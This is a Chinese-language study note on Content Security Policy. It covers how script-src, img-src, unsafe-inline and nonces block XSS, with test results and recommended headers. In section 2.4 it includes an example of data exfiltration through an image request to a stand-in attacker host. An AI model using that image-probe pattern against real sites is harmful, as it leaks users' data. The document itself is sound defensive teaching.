# CSP（内容安全策略）

> **结论：CSP = 通过响应头 `Content-Security-Policy` 告诉浏览器「本页面允许加载哪些资源」，由浏览器强制执行。** 它是 **XSS 的纵深防御**：即使开发者忘了转义/过滤，CSP 也能把内联脚本、`onerror`、`eval` 等拦截下来。核心指令：**`script-src`**（JS 来源，最常配）、**`img-src`**（图片来源）、**`default-src`**（兜底其它资源）。实测：`script-src 'self'` 下，内联脚本、`eval`、`onerror` **全部拦截**，只有同源外部脚本放行；一旦加上 `'unsafe-inline'`，内联脚本和 `onerror` 全部复活（XSS 又通了）。所以 **`unsafe-inline` / `unsafe-eval` 是安全性的天敌，能不用就不用。**
>
> 可运行验证：[[CSP-验证脚本.cjs]]（Node + Chrome CDP 实测：无 CSP vs 不同 `script-src`/`img-src` 策略下，内联脚本、eval、onerror、外部脚本、远程图片的执行情况）

---

## 1. 背景：为什么需要 CSP

**浏览器信任一切加载的东西**：HTML 里的 `<script>`、`onerror`、`<img>`、`<iframe>` 都会执行/加载，不管来自哪里。XSS 就是利用了这一点——攻击者注入一段 `<script>` 或 `<img onerror>`，浏览器照单全收。

CSP 的思路：**不信任默认，用白名单声明**。服务器在响应头里说"本页只允许加载同源脚本、同源图片"，浏览器就**只放行这些**，其他一律拦截——**即使 HTML 里被注入了恶意标签**。

| 没有 CSP | 有 CSP |
| -------- | ------ |
| 页面里任何 `<script>`/`onerror` 都执行 | 只执行**策略允许**的；内联/外站全拦 |
| 依赖开发者"每次都不犯错" | **纵深防御**：开发者漏一次，CSP 兜住 |

## 2. 实测：不同策略的拦截效果

> 环境：本机 Node v26.8.1 + Chrome CDP。同一页面同时含：内联脚本（`window.__inlineRan=1`）、`eval()`、同源外部脚本 `/ext.js`、`<img onerror>`、远程图片。用不同 CSP 响应头观察哪些执行了。

### 2.1 无 CSP（对照组）——一切照常

```
[无 CSP] 内联脚本:执行✅ | eval:执行✅ | 外部脚本:执行✅ | onerror:执行🚨
```

- 没有任何限制，内联脚本、eval、onerror 全部执行。**这就是 XSS 能得逞的默认世界。**

### 2.2 `script-src 'self'` —— 拦死所有非同源脚本

```
[script-src 'self'] 内联脚本:拦截🚫 | eval:拦截🚫 | 外部脚本:执行✅ | onerror:未执行✅
```

- **只放行同源（`'self'`）外部脚本**：`/ext.js` 正常执行。
- **内联脚本被拦截**、**eval 被拦截**、**`<img onerror>` 的 onerror 不执行**——三个最常见的 XSS 注入面全被堵死。
- 这就是 CSP 作为 XSS 纵深防御的价值：**即使开发者用 `innerHTML` 拼了用户输入，CSP 也把注入的 `onerror` 拦在门外**（关联 [[XSS]]）。

### 2.3 `script-src 'self' 'unsafe-inline'` —— 内联放开，防线崩

```
[+unsafe-inline] 内联脚本:执行✅ | eval:拦截🚫 | 外部脚本:执行✅ | onerror:执行🚨
```

- 加了 `'unsafe-inline'` 后，**内联脚本复活**（`window.__inlineRan=1` 执行）。
- **`onerror` 也复活**（`onerror` 本质是内联事件处理器，属于 inline 类）——**XSS 注入点全通了**。
- 注意 `eval` **仍被拦**（`unsafe-eval` 是另一个开关）。
- **教训**：`unsafe-inline` 是 CSP 最大的漏洞来源——为了"方便"放行内联，等于把 CSP 对 XSS 的防护拆掉大半。现代做法用 **nonce 或 hash** 精确放行特定内联脚本，而不是无差别 `unsafe-inline`。

### 2.4 `img-src 'self'` —— 只限制图片来源

```
[img-src 'self'] 内联脚本:执行✅ | eval:执行✅ | 外部脚本:执行✅ | onerror:执行🚨 | 远程图:拦截🚫
```

- 只限制**图片**：远程图（`http://evil.example/x.png`）被拦截。
- 脚本不受影响（没配 `script-src`，走默认全放行）。
- **用途**：防"加载外站图片"——这是常见的数据外带通道（比如攻击者用 `<img src="http://attacker/?偷的数据">` 把信息发出去）。`img-src` 能切断这类 **CSRF/数据外带** 用图片探针的方式。

### 2.5 实测汇总表

| CSP 策略 | 内联脚本 | eval | 同源外部脚本 | `onerror` | 远程图片 |
| -------- | -------- | ---- | ------------ | --------- | -------- |
| 无 CSP | 执行🚨 | 执行🚨 | 执行 | 执行🚨 | 加载 |
| `script-src 'self'` | **拦截🚫** | **拦截🚫** | 执行 ✅ | **拦截✅** | 加载 |
| `script-src 'self' 'unsafe-inline'` | 执行🚨 | 拦截🚫 | 执行 | 执行🚨 | 加载 |
| `img-src 'self'` | 执行 | 执行 | 执行 | 执行 | **拦截🚫** |

> 一句话：**`script-src 'self'` 是 XSS 兜底，`unsafe-inline` 是自拆防线，`img-src` 管数据外带。**

## 3. 深入：为什么这样设计？

### 3.1 为什么 CSP 不是"默认开启"

CSP 依赖**白名单**，但页面资源来源千变万化（CDN、内联脚本、`eval`、动态生成的样式……）。如果强制开，大量合法页面会崩。所以 CSP 是**响应头可选项**，且需要开发者**主动配置**——这是"默认安全"做不到的（浏览器不知道哪些是合法来源）。

### 3.2 为什么 `'unsafe-inline'` 这么危险

内联脚本无法用"来源"（URL）来区分合法/非法——**所有内联脚本都是"来源为页面本身"**，浏览器无法判断哪个是开发者写的、哪个是 XSS 注入的。CSP 的 `script-src` 默认拦**所有**内联脚本（宁可误杀），这就是安全。而 `unsafe-inline` 告诉浏览器"放行所有内联"——**把判断权交还给了 HTML 解析器**，XSS 注入的内联脚本与合法内联脚本长得一模一样，浏览器无法区分 → 防线失效。**nonce/hash 方案**（给合法内联脚本打个一次性随机标记）既保留内联能力又不放开全部，是现代推荐做法。

### 3.3 为什么 `eval` 单独一个开关（`unsafe-eval`）

`eval`/`new Function` 是**字符串变代码**的入口，和 XSS 的"数据变代码"是同一种危险模式。所以 CSP 把 `eval` 单独隔离成 `unsafe-eval`——**默认也拦**，必须显式放开。大量老库/老代码依赖 `eval`（如 JSONP、某些模板引擎），所以单独开关方便只放开需要的人。

### 3.4 CSP 与 XSS/CSRF 的关系

- 对 **[[XSS]]**：CSP 是**兜底层**——转义是第一道（让数据安全），CSP 是第二道（即便注入也拦执行）。但 CSP **不能替代转义**：`unsafe-inline` 下 XSS 复活（实测 2.3），且 CSP 管不到已加载脚本内部的逻辑漏洞。
- 对 **[[CSRF]]**：`img-src`/`connect-src` 能限制攻击者用图片/fetch 做数据外带，但 CSRF 主防是 SameSite/Token（CSP 是辅助）。

## 4. 规避 / 实践

| 场景 | 做法 |
| ---- | ---- |
| 页面 JS 全部同源 | `Content-Security-Policy: default-src 'self'; script-src 'self'`（最稳） |
| 需要 CDN 脚本 | `script-src 'self' https://cdn.example.com`（白名单精确到域） |
| 需要少量内联脚本 | **nonce**：`script-src 'self' 'nonce-随机值'` + `<script nonce="随机值">` |
| 完全禁用内联/eval | 不加 `unsafe-inline` / `unsafe-eval`，用 nonce/hash |
| 富文本/第三方内容 | `frame-src` 限制 iframe、`img-src` 限制图源、`object-src 'none'` |
| 只想防数据外带 | `img-src 'self'` / `connect-src 'self'`（限制图片和 fetch） |
| 灰度上线 | `Content-Security-Policy-Report-Only`（只报告不拦截，看误伤再收紧） |
| 上报违规 | `report-uri` / `report-to` 收 CSP 违规报告 |

```http
# 一个较严的 CSP：只放行同源 + 明确 CDN，禁内联/禁 eval
Content-Security-Policy: default-src 'none'; script-src 'self' https://cdn.example.com; \
  style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; \
  object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

```html
<!-- nonce 精确放行特定内联脚本（不放开全部 inline） -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-abc123'">
<script nonce="abc123">window.safeInline = 1;</script>   <!-- 放行 -->
<script>window.evil = 1;</script>                          <!-- 拦截（无 nonce） -->
```

```js
// 灰度量：先只报告，不拦截，看误伤
// Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report
// 违规会上报到 /csp-report，但页面不拦 —— 确认无误后切到真策略
```

## 5. 面试速记

> **30 秒版**："CSP 是内容安全策略，通过响应头告诉浏览器页面允许加载什么，浏览器强制执行。它是 XSS 的纵深防御——即便开发者忘了转义，`script-src 'self'` 也能把内联脚本、onerror、eval 全拦下来，实测只放行同源外部脚本。但 `unsafe-inline` 一加，内联和 onerror 全复活，XSS 防线就破了——因为内联脚本无法用来源区分合法与注入，浏览器只能全拦或全放。现代做法用 nonce/hash 精确放行。`img-src` 单独管图片来源，防数据外带。还有 report-only 模式可以先灰度。核心：能不用 unsafe-inline/unsafe-eval 就不用。"

## 相关笔记

- [[XSS]] —— CSP 是 XSS 的纵深防御；转义是根治、CSP 是兜底
- [[CSRF]] —— `img-src`/`connect-src` 限制数据外带通道，辅助防 CSRF
- [[CJS，UMD，ESM 的区别]] —— 现代前端打包产物与 CSP 的 nonce/hash 配合
- [[从浏览器输入网址到页面完整展示全过程]] —— CSP 响应头在「收到响应」阶段解析并约束资源加载

*本文档基于 CSP Level 3（W3C）、MDN CSP 文档及本机 Node v26.8.1 + Chrome CDP 实测整理。验证脚本位于同目录。*
